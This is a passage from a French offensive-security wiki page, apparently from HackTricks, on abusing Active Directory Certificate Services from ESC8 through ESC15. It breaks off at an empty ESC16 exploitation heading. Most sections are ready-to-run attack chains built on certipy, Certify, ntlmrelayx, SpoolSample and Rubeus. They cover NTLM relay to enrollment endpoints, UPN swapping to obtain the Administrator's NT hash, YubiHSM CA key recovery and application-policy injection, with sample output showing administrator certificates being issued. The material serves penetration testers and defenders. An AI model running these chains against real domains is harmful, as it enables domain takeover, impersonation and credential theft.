> Dans les environnements où **AD CS est installé**, s’il existe un **point de terminaison d’inscription web vulnérable** et qu’au moins un **modèle de certificat est publié** et autorise **l’inscription des ordinateurs du domaine et l’authentification client** (comme le modèle par défaut **`Machine`**), un attaquant peut compromettre **n’importe quel ordinateur dont le service spooler est actif** !

AD CS prend en charge plusieurs **méthodes d’inscription via HTTP**, disponibles grâce à des rôles de serveur supplémentaires que les administrateurs peuvent installer. Ces interfaces d’inscription de certificats via HTTP sont vulnérables aux **attaques par relais NTLM**. Depuis une **machine compromise, un attaquant peut usurper l’identité de tout compte AD qui s’authentifie par NTLM entrant**. En usurpant l’identité du compte victime, l’attaquant peut accéder à ces interfaces web pour **demander un certificat d’authentification client à l’aide des modèles de certificats `User` ou `Machine`**.

- L’**interface d’inscription web** (une ancienne application ASP disponible à l’adresse `http://<caserver>/certsrv/`) utilise HTTP uniquement par défaut, ce qui ne protège pas contre les attaques par relais NTLM. De plus, elle n’autorise explicitement que l’authentification NTLM via son en-tête HTTP Authorization, rendant inapplicables les méthodes d’authentification plus sécurisées comme Kerberos.
- Par défaut, le **Certificate Enrollment Service** (CES), le service web **Certificate Enrollment Policy** (CEP) et le **Network Device Enrollment Service** (NDES) prennent en charge l’authentification Negotiate via leur en-tête HTTP Authorization. L’authentification Negotiate **prend en charge à la fois** Kerberos et **NTLM**, ce qui permet à un attaquant de **rétrograder l’authentification vers NTLM** lors d’attaques par relais. Bien que ces services web activent HTTPS par défaut, HTTPS seul **ne protège pas contre les attaques par relais NTLM**. La protection contre les attaques par relais NTLM pour les services HTTPS n’est possible que si HTTPS est associé à la liaison de canal. Malheureusement, AD CS n’active pas la protection étendue pour l’authentification dans IIS, pourtant nécessaire à la liaison de canal.<sup>[[6]](#references)</sup>

Un **problème** courant des attaques par relais NTLM est la **courte durée des sessions NTLM** et l’impossibilité pour l’attaquant d’interagir avec les services qui **exigent la signature NTLM**.

Cette limitation peut néanmoins être contournée en exploitant une attaque par relais NTLM pour obtenir un certificat pour l’utilisateur : la durée de validité du certificat détermine celle de la session, et le certificat peut être utilisé avec des services qui **exigent la signature NTLM**. Pour savoir comment utiliser un certificat volé, consultez :


{{#ref}}
account-persistence.md
{{#endref}}

Une autre limitation des attaques par relais NTLM est qu’**un compte victime doit s’authentifier auprès d’une machine contrôlée par l’attaquant**. L’attaquant peut attendre ou tenter de **forcer** cette authentification :


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Exploitation**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` énumère les **points de terminaison HTTP AD CS activés** :<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La propriété `msPKI-Enrollment-Servers` est utilisée par les autorités de certification d’entreprise (CA) pour stocker les points de terminaison du Certificate Enrollment Service (CES). Ces points de terminaison peuvent être analysés et répertoriés à l’aide de l’outil **Certutil.exe** :

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abus avec Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Abus avec [Certipy](https://github.com/ly4k/Certipy)

Par défaut, Certipy demande un certificat en fonction du modèle `Machine` ou `User`, selon que le nom du compte relayé se termine ou non par `$`. Il est possible de spécifier un autre modèle à l’aide du paramètre `-template`.

Une technique comme [PetitPotam](https://github.com/ly4k/PetitPotam) peut ensuite être utilisée pour forcer l’authentification. Pour les contrôleurs de domaine, il est nécessaire de spécifier `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explication

La valeur **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) de **`msPKI-Enrollment-Flag`**, appelée ESC9, omet l’extension SID `szOID_NTDS_CA_SECURITY_EXT` d’un certificat. Les exemples ESC9 plus anciens dépendent du comportement de compatibilité du KDC (`StrongCertificateBindingEnforcement=1`) ou d’une autre méthode de mapping Schannel faible. La valeur `1` est un **paramètre de compatibilité historique**, et non la valeur par défaut actuelle : Microsoft indique que la surcharge du KDC n’est plus prise en charge depuis la mise à jour de sécurité Windows du 9 septembre 2025. Vérifiez la mise à jour réellement appliquée à la cible ainsi que le point de terminaison d’authentification avant d’utiliser une ancienne méthode.<sup>[[7]](#references)</sup> Consultez les [instructions de déploiement de Microsoft](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Les conditions dans lesquelles la configuration de cet indicateur devient importante incluent :

- Sur un ancien KDC compatible, la stratégie effective de liaison de certificat autorise le mapping ; ou bien le point de terminaison Schannel active séparément le mapping UPN via le bit `0x4` de `CertificateMappingMethods`.
- Le certificat comporte l’indicateur `CT_FLAG_NO_SECURITY_EXTENSION` dans le paramètre `msPKI-Enrollment-Flag`.
- Le certificat spécifie une EKU d’authentification client.
- Des permissions `GenericWrite` sont disponibles sur un compte quelconque afin d’en compromettre un autre.

### Scénario d’abus

Supposons que `John@corp.local` dispose de permissions `GenericWrite` sur `Jane@corp.local` et cherche à compromettre `Administrator@corp.local`. Le modèle de certificat `ESC9`, auquel `Jane@corp.local` est autorisée à s’inscrire, est configuré avec l’indicateur `CT_FLAG_NO_SECURITY_EXTENSION` dans son paramètre `msPKI-Enrollment-Flag`.

Dans un premier temps, le hash de `Jane` est récupéré à l’aide de Shadow Credentials, grâce aux permissions `GenericWrite` de `John` :

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Par la suite, le `userPrincipalName` de `Jane` est modifié en `Administrator`, en omettant délibérément la partie domaine `@corp.local` :

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Cette modification ne viole pas les contraintes, étant donné que `Administrator@corp.local` reste distinct du `userPrincipalName` d’`Administrator`.

Ensuite, le modèle de certificat `ESC9`, marqué comme vulnérable, est demandé en tant que `Jane` :

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Il est à noter que le `userPrincipalName` du certificat correspond à `Administrator`, sans aucun « object SID ».

Le `userPrincipalName` de `Jane` est ensuite rétabli à sa valeur d'origine, `Jane@corp.local` :

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

La tentative d’authentification avec le certificat délivré renvoie désormais le NT hash de `Administrator@corp.local`. La commande doit inclure `-domain <domain>` car le certificat ne spécifie pas de domaine :

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Mappages de certificats faibles - ESC10

### Explication

Deux stratégies distinctes de mappage de certificats sont souvent évoquées dans le cadre d’ESC10. Consultez le paramètre sur le endpoint qui gère réellement l’authentification concernée :

- `CertificateMappingMethods` de Schannel sous `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` contrôle le mappage des certificats client TLS sur le serveur d’application. Le bit UPN est `0x4` ; la valeur par défaut est `0x18` (`0x8 | 0x10`) sur les systèmes mis à jour.
- `StrongCertificateBindingEnforcement` de KDC sous `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` contrôlait historiquement la compatibilité du binding des certificats Kerberos. La valeur `1` n’est pas une valeur par défaut actuelle fiable, et Microsoft a mis fin à la prise en charge de cette surcharge avec la mise à jour de sécurité Windows du 9 septembre 2025. Son état ne décrit pas, à lui seul, le mappage UPN de Schannel.<sup>[[7]](#references)</sup>

**Cas 1**

Historiquement, lorsqu’un KDC plus ancien respectait `StrongCertificateBindingEnforcement=0` ; vérifiez le niveau de mise à jour, car cette surcharge n’est plus prise en charge sur les systèmes actuels corrigés.

**Cas 2**

Lorsque le bit UPN (`0x4`) de `CertificateMappingMethods` est activé sur le endpoint Schannel de certificat client. Ce paramètre est distinct de l’application du strong binding par KDC et nécessite toujours un certificat d’authentification client pouvant être inscrit, ainsi qu’un contrôle effectif de l’attribut de compte mappé.

### Cas d’abus 1

Dans un ancien déploiement où le KDC respecte encore `StrongCertificateBindingEnforcement=0`, le contrôle du `userPrincipalName` d’un compte peut participer à un chemin de mappage faible vers un autre compte. L’inscription du certificat requise, le mappage, l’identité cible et la réussite de l’authentification doivent être vérifiés séparément ; un ACE `GenericWrite` ou une valeur de registre ne suffit pas à établir une prise de contrôle.

Par exemple, disposant des permissions `GenericWrite` sur `Jane@corp.local`, un attaquant cherche à compromettre `Administrator@corp.local`. La procédure reprend celle d’ESC9 et permet d’utiliser n’importe quel modèle de certificat.

Tout d’abord, le hash de `Jane` est récupéré à l’aide de Shadow Credentials, en exploitant `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Ensuite, le `userPrincipalName` de `Jane` est modifié en `Administrator`, en omettant délibérément la partie `@corp.local` pour éviter une violation de contrainte.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

À la suite de cela, un certificat permettant l’authentification client est demandé en tant que `Jane`, à l’aide du modèle `User` par défaut.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

Le `userPrincipalName` de `Jane` est ensuite rétabli à sa valeur d’origine, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

L’authentification avec le certificat obtenu permettra d’obtenir le hash NT de `Administrator@corp.local`, ce qui nécessite de spécifier le domaine dans la commande, car le certificat ne contient aucune information sur le domaine.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Cas d’abus 2

Avec `CertificateMappingMethods` contenant le bit `UPN` (`0x4`), un compte A disposant des permissions `GenericWrite` peut compromettre n’importe quel compte B dépourvu de la propriété `userPrincipalName`, y compris les comptes machine et le compte administrateur de domaine intégré `Administrator`.

Ici, l’objectif est de compromettre `DC$@corp.local`, en commençant par obtenir le hash de `Jane` via Shadow Credentials, en exploitant les permissions `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

Le `userPrincipalName` de `Jane` est alors défini sur `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Un certificat pour l’authentification client est demandé en tant que `Jane` à l’aide du modèle `User` par défaut.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

Le `userPrincipalName` de `Jane` retrouve sa valeur d’origine après ce processus.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Pour s’authentifier via Schannel, l’option `-ldap-shell` de Certipy est utilisée, indiquant que l’authentification a réussi en tant que `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Via le shell LDAP, des commandes telles que `set_rbcd` permettent de lancer des attaques par Resource-Based Constrained Delegation (RBCD), susceptibles de compromettre le contrôleur de domaine.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Cette vulnérabilité concerne également tout compte utilisateur dépourvu de `userPrincipalName` ou dont celui-ci ne correspond pas à `sAMAccountName`. Le compte par défaut `Administrator@corp.local` est une cible de choix en raison de ses privilèges LDAP élevés et de l’absence de `userPrincipalName` par défaut.

## Relaying NTLM to ICPR - ESC11

### Explication

Si le serveur CA n’est pas configuré avec `IF_ENFORCEENCRYPTICERTREQUEST`, il est possible de mener des attaques NTLM relay sans signature via le service RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Vous pouvez utiliser `certipy` pour vérifier si `Enforce Encryption for Requests` est désactivé ; `certipy` indiquera alors les vulnérabilités `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Scénario d’abus

Il faut configurer un serveur relais :

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Remarque : Pour les contrôleurs de domaine, nous devons spécifier `-template` dans DomainController.

Ou en utilisant le [fork d'impacket de sploutchy](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Shell access to ADCS CA with YubiHSM - ESC12

### Explication

Les administrateurs peuvent configurer l’autorité de certification pour qu’elle stocke sa clé sur un périphérique externe, comme le « Yubico YubiHSM2 ».

Si un périphérique USB est connecté au serveur CA via un port USB, ou à un serveur USB si le serveur CA est une machine virtuelle, une clé d’authentification (parfois appelée « mot de passe ») est requise par le Key Storage Provider pour générer et utiliser des clés dans le YubiHSM.

Cette clé/ce mot de passe est stocké en clair dans le registre, sous `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.

Référence [ici](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scénario d’exploitation

Si la clé privée de la CA est stockée sur un périphérique USB physique lorsque vous obtenez un accès shell, il est possible de récupérer la clé.

Tout d’abord, vous devez obtenir le certificat de la CA (qui est public), puis :

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Enfin, utilisez la commande `certutil -sign` pour forger un nouveau certificat arbitraire à l’aide du certificat de l’AC et de sa clé privée.

## OID Group Link Abuse - ESC13

### Explication

L’attribut `msPKI-Certificate-Policy` permet d’ajouter une stratégie d’émission au modèle de certificat. Les objets `msPKI-Enterprise-Oid` responsables de l’émission des stratégies peuvent être découverts dans le contexte d’attribution de noms Configuration (CN=OID,CN=Public Key Services,CN=Services) du conteneur PKI OID. Une stratégie peut être liée à un groupe AD à l’aide de l’attribut `msDS-OIDToGroupLink` de cet objet, ce qui permet à un système d’autoriser un utilisateur qui présente le certificat comme s’il était membre du groupe. [Référence ici](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

En d’autres termes, lorsqu’un utilisateur est autorisé à s’inscrire pour obtenir un certificat et que celui-ci est lié à un groupe OID, l’utilisateur peut hériter des privilèges de ce groupe.

Utilisez [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) pour trouver OIDToGroupLink :

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Scénario d’abus

Trouvez un utilisateur disposant d’une permission, à l’aide de `certipy find` ou de `Certify.exe find /showAllPermissions`.

Si `John` a la permission de s’inscrire à `VulnerableTemplate`, il peut hériter des privilèges du groupe `VulnerableGroup`.

Il lui suffit de spécifier le modèle pour obtenir un certificat avec les droits `OIDToGroupLink`.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Abus du mappage explicite de certificats — ESC14

### Explication

La description à l’adresse https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping est remarquablement détaillée. Vous trouverez ci-dessous une citation du texte original.<sup>[[14]](#references)</sup>

ESC14 concerne les vulnérabilités dues à un « mappage explicite faible de certificats », principalement causées par une mauvaise utilisation ou une configuration non sécurisée de l’attribut `altSecurityIdentities` sur les comptes d’utilisateurs ou d’ordinateurs Active Directory. Cet attribut multivalué permet aux administrateurs d’associer manuellement des certificats X.509 à un compte AD à des fins d’authentification. Lorsqu’ils sont renseignés, ces mappages explicites peuvent remplacer la logique de mappage de certificats par défaut, qui s’appuie généralement sur les UPN ou les noms DNS du SAN du certificat, ou sur le SID intégré à l’extension de sécurité `szOID_NTDS_CA_SECURITY_EXT`.

Un mappage est dit « faible » lorsque la valeur de chaîne utilisée dans l’attribut `altSecurityIdentities` pour identifier un certificat est trop générale, facile à deviner, repose sur des champs de certificat non uniques ou utilise des composants de certificat faciles à usurper. Si un attaquant peut obtenir ou créer un certificat dont les attributs correspondent à un tel mappage explicite faible pour un compte privilégié, il peut utiliser ce certificat pour s’authentifier en tant que ce compte et usurper son identité.

Voici quelques exemples de chaînes de mappage `altSecurityIdentities` potentiellement faibles :

- Mappage fondé uniquement sur un nom commun (CN) de sujet courant, par exemple `X509:<S>CN=SomeUser`. Un attaquant pourrait obtenir un certificat comportant ce CN auprès d’une source moins sécurisée.
- Utilisation de noms distinctifs (DN) d’émetteur ou de sujet trop génériques, sans qualification supplémentaire comme un numéro de série précis ou un identifiant de clé de sujet, par exemple `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Utilisation d’autres modèles prévisibles ou d’identifiants non cryptographiques qu’un attaquant pourrait faire correspondre à un certificat qu’il peut obtenir légitimement ou falsifier (s’il a compromis une CA ou trouvé un modèle vulnérable comme dans ESC1).

L’attribut `altSecurityIdentities` prend en charge différents formats de mappage, notamment :

- `X509:<I>IssuerDN<S>SubjectDN` (mappage selon le DN complet de l’émetteur et du sujet)
- `X509:<SKI>SubjectKeyIdentifier` (mappage selon la valeur de l’extension Subject Key Identifier du certificat)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mappage selon le numéro de série, implicitement qualifié par le DN de l’émetteur) — ce n’est pas un format standard ; il s’agit généralement de `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mappage selon un nom RFC822, généralement une adresse e-mail, provenant du SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mappage selon un hachage SHA1 de la clé publique brute du certificat — généralement fort)

La sécurité de ces mappages dépend des identifiants utilisés. Microsoft considère comme **faibles** les mappages fondés sur les e-mails ou les noms de sujet, notamment `X509:<RFC822>`. En mode Full Enforcement, un certificat dépourvu de mappage fort est rejeté ; la mise à jour de sécurité Windows de septembre 2025 a supprimé la possibilité de revenir au mode Compatibility. Un mappage faible ne constitue donc pas, à lui seul, une méthode d’usurpation fiable dans les environnements actuels. Vérifiez le niveau de correctifs réel du contrôleur de domaine et son comportement de mappage des certificats avant d’évaluer un scénario de mappage faible. L’accès en écriture à `altSecurityIdentities` constitue une piste distincte : un attaquant disposant d’un certificat approuvé adéquat peut éventuellement ajouter un mappage explicite **fort**, sous réserve des autorisations effectives et de la validation du certificat. Voir [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) et [la recherche sur ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Les échecs d’authentification par certificat doivent également être diagnostiqués : un compte cible désactivé ou un mot de passe expiré peut empêcher la connexion même si le certificat lui-même reste valide.

### Scénario d’abus

ESC14 cible les **mappages explicites de certificats** dans Active Directory (AD), en particulier l’attribut `altSecurityIdentities`. Si cet attribut est renseigné (intentionnellement ou à la suite d’une mauvaise configuration), les attaquants peuvent usurper l’identité de comptes en présentant des certificats correspondant au mappage.

#### Scénario A : l’attaquant peut écrire dans `altSecurityIdentities`

 **Prérequis** : l’attaquant dispose de droits d’écriture sur l’attribut `altSecurityIdentities` du compte cible, ou de l’autorisation de les lui accorder grâce à l’une des permissions suivantes sur l’objet AD cible :  
- Write property `altSecurityIdentities`  
- Write property `Public-Information`  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Scénario B : la cible dispose d’un mappage faible via X509RFC822 (e-mail)

- **Prérequis historique/conditionnel** : la cible possède un mappage faible X509RFC822 dans `altSecurityIdentities`, l’attaquant peut modifier l’attribut `mail` d’un demandeur et un modèle adapté inclut cette adresse e-mail dans un certificat d’authentification client sans liaison SID contradictoire. L’authentification nécessite également un environnement qui accepte encore le mappage faible ; Full Enforcement rejette les certificats dont le mappage est uniquement faible. Un attribut `mail` modifiable constitue seulement une piste.
#### Scénario C : la cible dispose d’un mappage X509IssuerSubject

- **Prérequis** : la cible possède un mappage explicite X509IssuerSubject faible dans `altSecurityIdentities`. L’attaquant peut définir l’attribut `cn` ou `dNSHostName` d’un principal victime pour qu’il corresponde au sujet du mappage X509IssuerSubject de la cible. L’attaquant peut alors demander un certificat en tant que victime et l’utiliser pour s’authentifier en tant que cible.
#### Scénario D : la cible dispose d’un mappage X509SubjectOnly

- **Prérequis** : la cible possède un mappage explicite X509SubjectOnly faible dans `altSecurityIdentities`. L’attaquant peut définir l’attribut `cn` ou `dNSHostName` d’un principal victime pour qu’il corresponde au sujet du mappage X509SubjectOnly de la cible. L’attaquant peut alors demander un certificat en tant que victime et l’utiliser pour s’authentifier en tant que cible.
### Opérations concrètes
#### Scénario A

Demander un certificat du modèle de certificat `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Enregistrer et convertir le certificat

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 S’authentifier (à l’aide du certificat)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Nettoyage (facultatif)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Pour des méthodes d’attaque plus spécifiques dans différents scénarios d’attaque, veuillez consulter : [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explication

La [recherche originale sur ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) explique comment les stratégies d’application fournies dans une requête pour un modèle V1 peuvent remplacer l’Extended Key Usage configuré sur une **CA émettrice non corrigée**.<sup>[[15]](#references)</sup> Il faut également disposer d’un modèle publié et ouvert à l’inscription, qui autorise les propriétés requises de sujet/requête et ne comporte aucune étape bloquante d’approbation ou de signature. Les droits d’inscription ne suffisent pas à prouver qu’une exploitation est possible. L’utilisation d’un Certificate Request Agent peut aussi dépendre d’un second modèle adapté et de restrictions applicables aux agents d’inscription ; vérifiez l’état des correctifs de la CA et le résultat de l’émission avant d’affirmer que cette voie est exploitable.

### Exploitation

La [documentation de Certipy sur l’élévation de privilèges](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) contient des exemples d’utilisation plus détaillés.<sup>[[14]](#references)</sup>


La commande `find` de Certipy peut aider à identifier les modèles V1 potentiellement vulnérables à ESC15 si la CA n’est pas corrigée.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Scénario A : usurpation directe via Schannel

**Étape 1 : Demander un certificat en injectant la stratégie d’application « Client Authentication » et l’UPN de la cible.** L’attaquant `attacker@corp.local` cible `administrator@corp.local` à l’aide du modèle V1 « WebServer » (qui autorise le sujet fourni par le demandeur).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'` : Le modèle V1 vulnérable avec « Enrollee supplies subject ».
- `-application-policies 'Client Authentication'` : Injecte l’OID `1.3.6.1.5.5.7.3.2` dans l’extension Application Policies du CSR.
- `-upn 'administrator@corp.local'` : Définit l’UPN dans le SAN pour l’usurpation d’identité.

**Étape 2 : Authentifiez-vous via Schannel (LDAPS) à l’aide du certificat obtenu.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scénario B : Impersonation PKINIT/Kerberos via abus d’Enrollment Agent

**Étape 1 : Demander un certificat à partir d’un modèle V1 (avec « Enrollee supplies subject »), en injectant l’Application Policy « Certificate Request Agent ».** Ce certificat est destiné à l’attaquant (`attacker@corp.local`) afin qu’il devienne un agent d’inscription. Aucun UPN n’est spécifié pour l’identité propre de l’attaquant, car l’objectif est d’obtenir les capacités d’agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'` : Injecte l’OID `1.3.6.1.4.1.311.20.2.1`.

**Étape 2 : Utilisez le certificat « agent » pour demander un certificat au nom d’un utilisateur privilégié cible.** Cette étape est similaire à ESC3 et utilise le certificat de l’étape 1 comme certificat d’agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Étape 3 : Authentifiez-vous en tant qu’utilisateur privilégié à l’aide du certificat « on-behalf-of ».**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Extension de sécurité désactivée sur la CA (globalement)-ESC16

### Explication

**ESC16 (élévation de privilèges via l’absence de l’extension szOID_NTDS_CA_SECURITY_EXT)** désigne la désactivation, à l’échelle de la CA, de l’extension SID **szOID_NTDS_CA_SECURITY_EXT**. Il s’agit d’un indicateur de configuration, et non d’une preuve qu’un certificat peut s’authentifier en tant qu’un autre compte. L’usurpation d’identité nécessite également le contrôle des attributs ou du mappage du compte concerné, un modèle d’authentification client auquel il est possible de s’inscrire, ainsi qu’un chemin de mappage de certificat accepté par le contrôleur de domaine ou le service concerné. Un KDC corrigé en mode Full Enforcement rejette les certificats sans extension SID, sauf s’ils disposent d’un autre mappage fort ; la procédure Kerberos basée uniquement sur l’UPN ci-dessous concerne les anciens KDC ou ceux en mode de compatibilité qui acceptent encore un mappage faible. Consultez les [instructions de Microsoft sur le mappage des certificats et l’application des règles](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Vous pouvez également consulter cet article pour en savoir plus sur le principe détaillé :https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Exploitation

